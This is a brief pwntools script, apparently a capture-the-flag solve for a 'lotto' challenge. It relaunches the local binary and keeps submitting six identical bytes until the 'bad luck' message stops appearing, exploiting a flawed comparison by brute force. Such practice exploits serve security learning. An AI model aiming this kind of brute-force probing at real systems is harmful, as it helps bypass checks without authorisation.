from pwn import *

context.log_level = 'error'
payload = b'######'

while True:
    p = process(['/home/lotto/lotto'])
    p.recvuntil(b'Select Menu')
    p.sendline(b'1')
    p.recvuntil(b'Submit your 6 lotto bytes :')
    p.send(payload)
    output = p.recvall(timeout=1).decode(errors='ignore')
    if "bad luck..." not in output:
        print(output)
        break
    p.close()
